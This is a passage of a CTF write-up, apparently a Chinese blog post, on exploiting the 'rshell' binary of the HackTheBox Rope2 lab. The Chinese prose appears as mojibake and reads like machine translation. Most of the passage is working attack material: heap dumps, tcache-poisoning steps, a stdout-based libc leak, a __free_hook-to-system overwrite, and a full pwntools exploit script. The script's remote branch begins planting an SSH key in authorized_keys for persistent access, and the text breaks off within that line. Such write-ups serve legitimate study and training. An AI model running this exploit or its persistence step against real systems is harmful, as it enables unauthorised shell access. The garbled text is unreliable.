<p>å½“ç¬¬ä¸€æ¬¡è§£å†³è¿™ä¸ªé—®é¢˜æ—¶ï¼Œæ²¡æœ‰æ·»åŠ è¿”å›ä»»ä½•ä¸œè¥¿ï¼Œä½†æ›´æ–°å®ƒè¿”å›ä»»ä½•è¿”å›çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å¯ä»¥æ•æ‰å®ƒï¼Œå¹¶ä»å®ƒè·å¾—libcåœ°å€ã€‚</p>
<p>å°†æŸ¥çœ‹è¿™ä¸ªåœ°å€å’Œ&#x2F;proc&#x2F;$(pidof rshell)&#x2F;mapsæ–‡ä»¶ï¼Œä»¥æŸ¥çœ‹ä»å®ƒåˆ°libcåŸºå€çš„åç§»é‡æ˜¯0x1e7570ã€‚</p>
<ul>
<li>è¿½åŠ ASLRè¯´æ˜</li>
</ul>
<p>å‰é¢æåˆ°è¿‡ï¼Œè¿™é‡Œæœ‰ä¸€äº›å…³äºASLRçš„é—®é¢˜ã€‚æ­£åœ¨ä¿®æ”¹åº•éƒ¨çš„ä¸¤ä¸ªå­—èŠ‚(æˆ–å››ä¸ªå­—èŠ‚)ã€‚ä½†åªçŸ¥é“æƒ³è¦çš„low three nibblesæ˜¯ä»€ä¹ˆã€‚å› æ­¤ï¼Œåœ¨çŒœæµ‹ç¬¬å››ç‚¹ã€‚æœ‰2^4 &#x3D; 16ä¸ªå¯èƒ½çš„å€¼ï¼Œæ‰€ä»¥1&#x2F;16çš„æœºä¼šæ˜¯æ­£ç¡®çš„ï¼Œ6.25%å°½ç®¡å¦‚æ­¤ï¼Œä»ç„¶å¯ä»¥åå¤è¿›è¡Œæ”»å‡»ï¼Œæ‰€ä»¥åœ¨10æ¬¡å°è¯•ä¸­ï¼Œæˆ‘æœ‰50%çš„å‡ ç‡æˆåŠŸï¼Œåœ¨20æ¬¡å°è¯•ä¸­ï¼Œæœ‰75%çš„å‡ ç‡æˆåŠŸã€‚å°†æ›´æ–°è„šæœ¬ä»¥å¾ªç¯å¤±è´¥ã€‚</p>
<h2 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h2><ul>
<li>å†™åˆ°__free_hook</li>
</ul>
<p>æ—¢ç„¶æ³„éœ²äº†libcçš„æ¶ˆæ¯ï¼Œå°±å¯ä»¥è¢«åˆ¤æ­»åˆ‘äº†ã€‚å°†ç”¨systemè¦†ç›–__free_hookï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªåŒ…å«â€&#x2F;bin&#x2F;shâ€çš„å—ã€‚</p>
<p>é‡åˆ°çš„ç¬¬ä¸€ä¸ªæŒ‘æˆ˜æ˜¯ï¼Œä¸èƒ½é‡Šæ”¾æŒ‡å‘_IO_2_1_stdout_çš„ â€œæ–‡ä»¶â€ï¼Œå› ä¸ºå®ƒå°†å¯¼è‡´å´©æºƒã€‚è¿™æ„å‘³ç€ä»ç°åœ¨å¼€å§‹ï¼Œåªèƒ½ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶ã€‚ç»™å‡ºçš„ç¬¬ä¸€ä¸ªå…³äºå¦‚ä½•åˆ›å»ºä¸€ä¸ªå‡å—çš„ä¾‹å­å®é™…ä¸Šå°±æ˜¯ä¸ºè¿™ä¸ªåšå‡†å¤‡çš„ã€‚å½“æœ€åˆåˆ°è¾¾è¿™ä¸€ç‚¹æ—¶ï¼Œå¿…é¡»è¿”å›å¹¶åœ¨ä¸€å¼€å§‹æ·»åŠ å®ƒï¼Œä»¥ä¾¿å®ƒå¯ä»¥ä»è¿™é‡Œè·å–(è¿™æ„å‘³ç€é‡æ–°å·¥ä½œæ‰€æœ‰çš„é—´è·ç­‰)ã€‚ä¸€æ—¦è¿™æ ·åšäº†ï¼Œå°±è¾¾åˆ°äº†ä»¥ä¸‹çŠ¶æ€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x00007ffff7fc4760] stdout  : </span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake1 from start, <span class="keyword">in</span> 0x60 tcache</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- real chunk B from start, <span class="keyword">in</span> 0x50 tcache</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000071</span><br><span class="line">-----------------------------------</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x55555555c3d0 (doubly linked list corruption 0x55555555c3d0 != 0x0 and 0x55555555c3d0 is broken)</span><br><span class="line">(0x20)   tcache_entry[0](5): 0x55555555c460 --&gt; 0x55555555c3e0 --&gt; 0x55555555c460 (overlap chunk with 0x55555555c450(freed) )</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](255): 0xfbad2887 (invalid memory)</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0                                             &lt;-- B</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) ) &lt;-- fake1</span><br><span class="line">(0x80)   tcache_entry[6](2): 0x55555555c400 (overlap chunk with 0x55555555c450(freed) )</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c3d0(freed) )</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ï¼Œå¯ä»¥è·å¾—å—fake1ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ä¿®æ”¹å½“å‰ä½äº0x50 tcacheä¸­çš„å—Bã€‚å¦‚æœç”¨ä¸€ä¸ªæŒ‡é’ˆæ›¿æ¢å½“å‰ä¸ºnull(è¡¨ç¤ºé“¾è¡¨çš„ç»“æŸ)çš„ç¬¬ä¸€ä¸ªå•è¯ï¼Œè¯¥æŒ‡é’ˆæœ‰æ•ˆåœ°è¿æ¥äº†tcacheåˆ—è¡¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;K&#x27;</span>, 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-8)) <span class="comment"># add free hook to tcache 0x50</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;K&#x27;</span>)               <span class="comment"># free file</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®Œè¿™äº›ä¹‹åï¼ŒæŒ‡é’ˆè¢«æ·»åŠ :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x00007ffff7fc65a0      0x000055555555000a  &lt;-- free_hook <span class="keyword">in</span> tcache</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>åœ¨heapinfoä¸­æ˜¾ç¤º:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 --&gt; 0x7ffff7fc65a0</span><br></pre></td></tr></table></figure>

<p>éœ€è¦å»æ‰2b0å—:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear from tcache with add, shrink, rm</span></span><br><span class="line">add(<span class="string">&#x27;J&#x27;</span>, 0x40)</span><br><span class="line">edit(<span class="string">&#x27;J&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;J&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨åªè¦æ·»åŠ ä¸€ä¸ª0x40å­—èŠ‚çš„æ¡ç›®ï¼Œç„¶åé‡Šæ”¾å®ƒã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;hook&#x27;</span>, 0x40, b<span class="string">&quot;/bin/sh\x00&quot;</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;hook&#x27;</span>, <span class="built_in">wait</span>=False)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>__free_hook Payload</li>
</ul>
<p>payloadä¹Ÿæœ‰ç‚¹æ£˜æ‰‹ã€‚ä¸€æ—¦å†™å…¥__free_hookï¼Œä¸èƒ½é‡Šæ”¾å®ƒè€Œä¸é€ æˆå´©æºƒï¼Œæ‰€ä»¥ä¸¤ä¸ªæ–‡ä»¶éƒ½è¢«æœ‰æ•ˆåœ°ä½¿ç”¨äº†ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°†æŠŠè¿™ä¸ªå—æŒ‡å‘__free_hookä¹‹å‰çš„8ä¸ªå­—èŠ‚ã€‚å°†ç”¨â€&#x2F;bin&#x2F;sh\x00â€è¦†ç›–è¿™äº›å­—èŠ‚ï¼Œç„¶åç»§ç»­ç³»ç»Ÿåœ°å€ã€‚è¿™æ ·ï¼Œå½“ç¨‹åºè¯»å–å—å†…å®¹(æˆ–å°†å…¶ä¼ é€’ç»™_free_hook)æ—¶ï¼Œå°±ä¼šå¾—åˆ°å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;shâ€ã€‚</p>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>æœ€åçš„è„šæœ¬åœ¨è¿™é‡Œã€‚å› ä¸ºPwnToolsä¸­çš„shellä¸æ˜¯å¾ˆå¥½ï¼Œæ‰€ä»¥ä¸ºè¿œç¨‹ç›®æ ‡æ·»åŠ äº†ä¸€è¡Œä»£ç ï¼Œä»¥ä¾¿è‡ªåŠ¨ç¼–å†™åˆ›å»ºauthorized_keysæ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è·³è½¬åˆ°SSHè¿æ¥ã€‚</p>
<ul>
<li>pwn_rshell.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">ls</span>():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res</span><br><span class="line">    </span><br><span class="line">def <span class="built_in">rm</span>(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/hackthebox/machine/rope2/id_rsa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create overlaps for end</span></span><br><span class="line">    add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">    add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br><span class="line">    edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br><span class="line">    add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">    edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;x&#x27;</span>, 0x30)                                  <span class="comment"># add for spacing</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;C&#x27;</span>, 0x60)   <span class="comment"># create block to be freed and steal pointer in tcache - C = 340</span></span><br><span class="line">    add(<span class="string">&#x27;D&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0)) <span class="comment"># create block and fake block to put fake block meta in place - D = 3b0</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;D&#x27;</span>) <span class="comment"># D in tcache 0x80</span></span><br><span class="line">    add(<span class="string">&#x27;E&#x27;</span>, 0x60, p64(0x21)*11)   <span class="comment"># create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;C&#x27;</span>)               <span class="comment"># f1 empty, C in 0x70 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;E&#x27;</span>, 0)      <span class="comment"># slot 2 -&gt; E, E-&gt;C in 0x70 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;E2&#x27;</span>, 0x60)  <span class="comment"># slots 1 and 2 -&gt; E, C in 0x70 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E&#x27;</span>)               <span class="comment"># slot 1 -&gt; E, E -&gt; C in 0x70 tache</span></span><br><span class="line">    edit(<span class="string">&#x27;E2&#x27;</span>, 0x60, b<span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># edit tcache pointer, C -&gt; fake2 in 0x70 tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;E3&#x27;</span>, 0x60)   <span class="comment"># fetch E, fake in 0x70 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;E3&#x27;</span>, 0x20)  <span class="comment"># E-end in 0x30 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E3&#x27;</span>)          <span class="comment"># E in 0x50 tcache</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;fake2&#x27;</span>, 0x60, p64(0)*9 + p64(0x31) + p64(0))   <span class="comment"># get fake block, change key for E</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E2&#x27;</span>) <span class="comment"># C</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x70) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free fake to fill tcache, then overwrite key protecting from double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(7):</span><br><span class="line">        edit(<span class="string">&#x27;fake2&#x27;</span>, 0x0)    <span class="comment"># free fake block, put 2f0 in 0x90 tcache</span></span><br><span class="line">        edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>) <span class="comment"># B</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify libc address</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x70)</span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + b<span class="string">&quot;\x60\x47&quot;</span>)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;F&#x27;</span>, 0x30)           <span class="comment"># fetch 460 chunk from tcache, 300 still in 0x40 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;F&#x27;</span>, 0)             <span class="comment"># 460 -&gt; 300 in 0x40 tcache, f1 -&gt; 460</span></span><br><span class="line">    add(<span class="string">&#x27;F2&#x27;</span>, 0x30)          <span class="comment"># f1 and f2 -&gt; 460, 300 in 0x40 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F&#x27;</span>)                  <span class="comment"># f2 -&gt; 460, 460 -&gt; 300 in 0x40 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;F2&#x27;</span>, 0x30, <span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># 460 -&gt; 3e0 -&gt; stdout in 0x40 tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get 460 from tcahce, shrink it, and release it</span></span><br><span class="line">    add(<span class="string">&#x27;F3&#x27;</span>, 0x30)</span><br><span class="line">    edit(<span class="string">&#x27;F3&#x27;</span>, 0x10)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get 3e0 from tcache, shrink it, and release it</span></span><br><span class="line">    add(<span class="string">&#x27;fake3&#x27;</span>, 0x30)       </span><br><span class="line">    edit(<span class="string">&#x27;fake3&#x27;</span>, 0x10)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean up F2</span></span><br><span class="line">    edit(<span class="string">&#x27;F2&#x27;</span>, 0x10, p64(0)*2) <span class="comment"># overwrtie pointer and key to allow double free</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        leak = add(<span class="string">&#x27;stdout&#x27;</span>, 0x30, p64(0xfbad1800) + p64(0)*2 + b<span class="string">&quot;\x00&quot;</span>*7)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&#x27;\x7f&#x27;</span> not <span class="keyword">in</span> leak:</span><br><span class="line">            log.failure(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    except EOFError:</span><br><span class="line">        log.failure(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">leaked_addr = u64(leak[8:16])</span><br><span class="line">log.success(f<span class="string">&#x27;Leaked address: 0x&#123;leaked_addr:x&#125;&#x27;</span>)</span><br><span class="line">libc.address = leaked_addr - 0x1e7570</span><br><span class="line">log.success(f<span class="string">&#x27;Libc base: 0x&#123;libc.address:x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Overwriting __free_hook&quot;</span>)</span><br><span class="line">add(<span class="string">&#x27;K&#x27;</span>, 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-8)) <span class="comment"># add free hook to tcache 0x50</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;K&#x27;</span>)               <span class="comment"># free file</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear from tcache with add, shrink, rm</span></span><br><span class="line">add(<span class="string">&#x27;J&#x27;</span>, 0x40)</span><br><span class="line">edit(<span class="string">&#x27;J&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;hook&#x27;</span>, 0x40, b<span class="string">&quot;/bin/sh\x00&quot;</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">log.info(<span class="string">&quot;Triggering shell&quot;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;hook&#x27;</span>, <span class="built_in">wait</span>=False)</span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p.sendline(<span class="string">&#x27;echo &quot;ssh-rsa 